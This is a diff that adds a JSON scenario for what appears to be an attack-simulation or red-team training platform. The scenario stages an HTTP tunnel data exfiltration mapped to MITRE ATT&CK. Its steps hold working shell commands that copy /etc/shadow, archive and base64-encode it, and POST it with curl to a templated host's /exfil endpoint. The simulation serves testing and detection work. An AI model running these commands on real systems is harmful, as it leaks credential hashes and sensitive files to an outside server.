@@ -1,0 +1,72 @@
+{
+  "id": "data_exfil_http_tunnel",
+  "name": "HTTP Tunnel Data Exfiltration",
+  "description": "教学与测试目的：通过 HTTP 隧道将敏感数据外泄到攻击者控制的服务器。利用合法 HTTP 流量（POST 请求）将窃取的文件分块传输，规避基于协议的检测。对应 MITRE ATT&CK 渗出（Exfiltration）战术阶段的应用层协议渗出技术（T1048.002）。",
+  "category": "exploitation",
+  "difficulty": "medium",
+  "estimatedDuration": "5 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Exfiltration"
+  ],
+  "mitreTechniques": [
+    "T1048.002"
+  ],
+  "baseline_group": "data-exfiltration",
+  "baselineGroup": "data-exfiltration",
+  "targetType": [
+    "windows_host",
+    "linux_host",
+    "local_ip"
+  ],
+  "steps": [
+    {
+      "id": "step1_collect_sensitive",
+      "name": "Collect Sensitive Data",
+      "description": "模拟数据收集：将目标系统中的敏感文件（如配置文件、凭据文件）打包压缩，准备外泄。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "mkdir -p /tmp/exfil_staging && cp /etc/shadow /tmp/exfil_staging/ 2>/dev/null; cp /etc/hosts /tmp/exfil_staging/ 2>/dev/null; echo 'SimulatedSecretData_2026' > /tmp/exfil_staging/secret.txt && cd /tmp/exfil_staging && tar czf /tmp/exfil_payload.tar.gz . && echo 'Staged files:' && ls -la /tmp/exfil_staging/ && echo 'Payload size:' && ls -la /tmp/exfil_payload.tar.gz"
+      ],
+      "score": 30,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1005"
+      ]
+    },
+    {
+      "id": "step2_encode_payload",
+      "name": "Encode Payload for Transport",
+      "description": "将打包的敏感数据编码为 Base64，以便通过 HTTP POST 请求体安全传输。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "base64 /tmp/exfil_payload.tar.gz > /tmp/exfil_b64.txt && echo \"Encoded size: $(wc -c < /tmp/exfil_b64.txt) bytes\" && echo \"First 80 chars: $(head -c 80 /tmp/exfil_b64.txt)\""
+      ],
+      "score": 30,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1132.001"
+      ]
+    },
+    {
+      "id": "step3_http_exfil",
+      "name": "Exfiltrate via HTTP POST",
+      "description": "通过 HTTP POST 请求将编码后的数据发送到攻击者控制的服务器（模拟为本地监听端口），利用合法 Web 流量规避检测。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "B64_DATA=$(cat /tmp/exfil_b64.txt) && curl -s -X POST -H 'Content-Type: application/octet-stream' -H 'X-Exfil-Session: test-$(date +%s)' --data-binary @/tmp/exfil_b64.txt http://{{host}}:8080/exfil 2>&1 || echo 'HTTP tunnel exfil attempt completed (target may not be listening - expected in test mode)'"
+      ],
+      "score": 40,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1048.002"
+      ]
+    }
+  ]
+}
